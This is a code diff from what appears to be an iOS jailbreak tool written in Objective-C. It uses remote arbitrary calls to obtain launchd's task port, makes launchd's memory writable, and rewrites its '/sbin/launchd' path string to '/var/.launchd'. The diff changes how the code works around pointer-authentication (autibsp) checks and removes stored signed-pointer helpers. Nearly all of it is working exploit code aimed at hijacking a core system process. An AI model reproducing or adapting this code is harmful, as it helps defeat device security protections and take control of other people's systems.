@@ -149,6 +149,7 @@ vm_offset_t findSbinLaunchdOff(void) {
 - (void)arbCallButtonTapped {
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
         kern_return_t kr;
+        
         // Create a region which holds temp data (should we use stack instead?)
         vm_size_t shared_size = getpagesize();
         vm_address_t map = RemoteArbCall(mmap, 0, shared_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
@@ -195,7 +196,6 @@ vm_offset_t findSbinLaunchdOff(void) {
             usleep(100000);
         } while (remote_dyld_base == 0);
         printf("dtsecurity dyld base: 0x%lx\n", remote_dyld_base);
-        blrX19Address = remote_dyld_base + blrX19Offset;
         
         // Get launchd task port
         kr = (kern_return_t)RemoteArbCall(task_for_pid, dtsecurity_task, 1, map);
@@ -237,7 +237,8 @@ vm_offset_t findSbinLaunchdOff(void) {
         vm_offset_t launchd_str_off = findSbinLaunchdOff();
         
         printf("reprotecting 0x%lx\n", launchd_base + launchd_str_off);
-        kr = (kern_return_t)RemoteArbCallBLR(vm_protect, launchd_task, launchd_base + launchd_str_off, 0x20, false, PROT_READ | PROT_WRITE | VM_PROT_COPY);
+        RemoteChangeLR(0xFFFFFF00); // fix autibsp
+        kr = (kern_return_t)RemoteArbCall(vm_protect, launchd_task, launchd_base + launchd_str_off, 0x20, false, PROT_READ | PROT_WRITE | VM_PROT_COPY);
         if (kr != KERN_SUCCESS) {
             printf("vm_protect failed\n");
             return;
@@ -246,7 +247,8 @@ vm_offset_t findSbinLaunchdOff(void) {
         // Overwrite /sbin/launchd string to /var/.launchd
         const char *newPath = "/var/.launchd";
         RemoteWriteString(map, newPath);
-        kr = (kern_return_t)RemoteArbCallBLR(vm_write, launchd_task, launchd_base + launchd_str_off, map, strlen(newPath));
+        RemoteChangeLR(0xFFFFFF00); // fix autibsp
+        kr = (kern_return_t)RemoteArbCall(vm_write, launchd_task, launchd_base + launchd_str_off, map, strlen(newPath));
         if (kr != KERN_SUCCESS) {
             printf("vm_write failed\n");
             return;
@@ -342,19 +344,4 @@ vm_offset_t findSbinLaunchdOff(void) {
     [self presentViewController:alert animated:YES completion:nil];
 }
 
-@end
-
-@implementation NSUserDefaults(Pref)
-- (void)setSignedPointer:(NSUInteger)signedPointer {
-    [self setObject:@(signed_pointer = signedPointer) forKey:@"signedPointer"];
-}
-- (NSUInteger)signedPointer {
-    return signed_pointer = [[self objectForKey:@"signedPointer"] unsignedIntegerValue];
-}
-- (void)setSignedDiversifier:(uint32_t)signedDiversifier {
-    [self setObject:@(signedDiversifier) forKey:@"signedDiversifier"];
-}
-- (uint32_t)signedDiversifier {
-    return [[self objectForKey:@"signedDiversifier"] unsignedIntValue];
-}
 @end
